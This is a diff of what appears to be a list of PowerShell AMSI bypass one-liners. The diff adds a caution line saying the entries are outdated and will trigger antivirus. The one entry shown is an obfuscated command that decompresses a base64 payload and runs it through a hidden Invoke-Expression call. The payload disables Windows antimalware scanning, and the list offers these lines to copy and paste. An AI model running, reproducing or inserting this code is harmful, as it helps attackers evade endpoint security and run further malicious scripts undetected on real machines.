@@ -1,5 +1,6 @@
-####Simply copy & paste one of these 4 lines into a powershell instance and bypass AMSI####
+# CAUTION - OUTDATED - NEEDS TO BE UPDATED - WILL TRIGGER AV
 
+####Simply copy & paste one of these 4 lines into a powershell instance and bypass AMSI####
 
 1. &((gEt-vARiabLE '*mdr*').NAME[3,11,2]-jOIN'')(nEW-oBJecT iO.CoMPReSsiON.deflATesTReam([IO.meMOrYsTream][COnVeRt]::fROmBAsE64strINg('rZH/asIwEMdfRURIZTV0Wh0I/pEMdYw5FusGTgSjnlLWpmLTbRLy7rsr29gDLJD7Se774bKaw2HNRVlCvs0ufAp2cTlBEDRd7F3Pu753195F3g286/pm59BgloXMWC4q9DYtDCcPOZ9pozFMLiXaI+SArsg1a1+1gtUCPi0fm12xT81xPRw+mxRjIMHEnrEWrG4L8w5ni83JucilLmEQf/cQB1niH5Z+zdLoHJgSWknSu6M7E2iVklZgqBUm8oVKgrXpkNgkhWwf/AdQTBCEclNj9eoVRbQipuSbEKMRKtNC5D1RyUiMl2Kp5Amz5V9GMY1r+yFef1lDFIjquV0aTUMfC4PtJ9r6Nkt3YWJ1/QE7fMATsC86qyBoOVNtsgcfttxiM6/At78A' ) , [io.COMpreSsIOn.cOMPresSionmOde]::DecomPResS )|FoREAcH-oBject { nEW-oBJecT IO.StReAmreaDeR( $_ ,[TEXT.enCoDiNG]::aScIi )}).ReadToENd( )
 
